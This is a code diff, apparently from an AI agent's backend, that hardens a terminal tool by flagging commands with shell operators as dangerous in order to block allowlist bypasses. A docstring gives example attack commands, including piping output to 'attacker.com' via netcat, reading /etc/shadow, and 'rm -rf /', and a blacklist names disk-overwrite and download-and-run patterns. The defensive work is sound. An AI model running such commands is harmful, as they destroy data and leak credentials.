@@ -8,6 +8,9 @@ import shlex
 import subprocess
 from typing import List
 
+from backend.domain.risk import RiskClass
+from backend.domain.shell import SHELL_OPERATORS, has_shell_operators as _has_shell_operators_fn
+
 from .base import BaseTool, ToolResult, ToolSchema
 
 
@@ -17,6 +20,9 @@ class TerminalTool(BaseTool):
 
     注意: Windows 7 上建议使用 PowerShell 命令
     """
+
+    # A1: 执行任意命令 — 模式门禁 + 命令 allowlist 精化
+    risk = RiskClass.EXEC
 
     # 危险命令黑名单
     DANGEROUS_PATTERNS: List[str] = [
@@ -30,6 +36,11 @@ class TerminalTool(BaseTool):
         "> /dev/sda",
         "wget.*curl.*sh",
     ]
+
+    # Shell 操作符 (A7 from OpenWorker) - 防止 allowlist 绕过
+    # A1: 上提到 backend/domain/shell.py 单一来源,与 PermissionEngine
+    # 共享,消除两处手工同步的漂移风险
+    SHELL_OPERATORS = SHELL_OPERATORS
 
     def _build_schema(self) -> ToolSchema:
         return ToolSchema(
@@ -48,6 +59,23 @@ class TerminalTool(BaseTool):
             },
         )
 
+    def _has_shell_operators(self, command: str) -> bool:
+        """
+        检查命令是否包含 shell 操作符 (A7 from OpenWorker)
+
+        防止 allowlist 绕过，如：
+        - rm -rf / ; cat /etc/passwd
+        - ls | nc attacker.com 1234
+        - echo $(cat /etc/shadow)
+
+        Args:
+            command: 要执行的命令
+
+        Returns:
+            是否包含 shell 操作符
+        """
+        return _has_shell_operators_fn(command)
+
     def _is_dangerous(self, command: str) -> bool:
         """
         检查命令是否危险
@@ -59,6 +87,10 @@ class TerminalTool(BaseTool):
             是否危险
         """
         command_lower = command.lower()
+
+        # A7: 检查是否包含 shell 操作符（防止 allowlist 绕过）
+        if self._has_shell_operators(command):
+            return True
 
         # 检查是否包含危险模式
         for pattern in self.DANGEROUS_PATTERNS:
